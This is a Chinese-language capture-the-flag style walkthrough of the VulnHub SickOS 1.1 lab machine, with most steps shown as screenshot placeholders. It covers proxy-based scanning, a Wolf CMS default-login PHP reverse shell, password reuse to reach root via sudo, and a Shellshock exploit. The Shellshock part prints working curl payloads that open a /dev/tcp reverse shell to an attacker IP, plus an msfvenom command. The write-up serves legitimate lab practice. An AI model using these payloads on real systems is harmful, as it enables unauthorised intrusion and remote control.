---
title: vulnhub-SickOS1.1
date: 2025-08-5
categories: [靶场]
tags:
  - dirb
  - Vulnhub靶场
  - gobuster
  - wolf CMS渗透
  - php reverse shell
  - nikto扫描
  - msfvenom
---





# 解法一：squid 代理
## 靶机扫描
ip：192.168.41.88

![](img/1.png)



![](img/2.png)

靶机操作系统

![](img/3.png)



漏洞脚本扫描

![](img/4.png)



openssh 版本 5.9p1

感觉漏洞存在于 3128 端口，squid-http 服务









### openssh
一般来说 ssh 不作为漏洞挖掘的第一要素，但是需要尝试弱口令和爆破。

先测试一波

![](img/5.png)

需要用户名、密码，卒。







### squid-http
是一个代理服务器

![](img/6.png)

搜索历史漏洞

![](img/7.png)





### web
![](img/8.png)

![](img/9.png)





有 web 了，首先想到的就是对 url 进行**目录爆破！！**

dirb：

![](img/10.png)

gobuster：

![](img/11.png)



没结果？why

靶机的 80 端口是否只能通过代理（3128 端口）访问？



![](img/12.png)



在 web 中访问这些 URL，直接访问是访问不到的

![](img/13.png)



需要在 kali 中设置代理

![](img/14.png)



## CMS 渗透
可以正常访问

![](img/15.png)

![](img/16.png)





![](img/17.png)







发现 wolfcms，尝试 URL

![](img/18.png)

![](img/19.png)





### 进入后台
这是一个 cms，**第一想到的就是去找到 cms 的管理员账号/路径**

上网找一下

![](img/20.png)





进入后台登录界面

![](img/21.png)



admin/admin 直接登录

![](img/22.png)

进入后台了    测试文件上传，xss，



### 后台测试
#### 测试点 1：php revrse shell
此处可以直接执行 php 代码

![](img/23.png)

将修改保存后开始研究如何触发刚才写入的 shell

想要触发 shell，就需要让系统运行写入 shell 的文件，找到该文件对应系统中实现的哪个功能即可。



查看后台的过程中还有以下测试点：

测试点 2：文件上传拿到 shell

![](img/24.png)



测试点 3：权限修改

![](img/25.png)



## 成功拿到 shell
![](img/26.png)

![](img/27.png)



进入后台了，然后呢？

信息搜集呗，有什么然后的！话呢么密

![](img/28.png)



#### 查看 config.php
![](img/29.png)

发现配置信息 root       john@123



尝试 ssh 连接  失败

![](img/30.png)

尝试直接登录  失败

![](img/31.png)



#### 查看 passwd
![](img/32.png)

好多用户名，测试这些用户名中是否有 john@123 的用户（吃经验、直觉）





最终测试成功：sickos

![](img/33.png)



## root
sudo -l			看见三个 ALL

![](img/34.png)



当前用户有直接的 root 运行权限，直接 sudo /bin/bash

![](img/35.png)

成功!!!







# 解法二：shellshock
### nikto 扫描
![](img/36.png)



### 拿到 shell
POC

```bash
sudo curl -v --proxy http://192.168.41.88:3128 http://192.168.41.88/cgi-bin/status -H "Referer:() {  test;}; echo 'Content-Type: text/plain'; echo; echo; /usr/bin/id;exit"
```

![](img/37.png)



编写 payload 获取反弹 shell

使用 msfvenom（底层的菜刀、蚁🗡、冰蝎）

```bash
sudo msfvenom -p cmd/unix/reverse_bash lhost=192.168.41.248 lport=443 -f raw
```

![](img/38.png)



测试：

payload

```bash
sudo curl -v --proxy http://192.168.41.88:3128 http://192.168.41.88/cgi-bin/status -H "Referer:() {  test;}; 0<&172-;exec 172<>/dev/tcp/192.168.41.248/443;sh <&172 >&172 2>&172"
```

![](img/39.png)![](img/remote-ba6ca147d7a8.png)

原因是：没有 sh 文件或目录

修改 payload：

```bash
sudo curl -v --proxy http://192.168.41.88:3128 http://192.168.41.88/cgi-bin/status -H "Referer:() {  test;}; 0<&172-;exec 172<>/dev/tcp/192.168.41.248/443;/bin/bash <&172 >&172 2>&172"
```



成功

![](img/40.png)

拿到 shell 是通过历史漏洞拿到的---》shellshock





















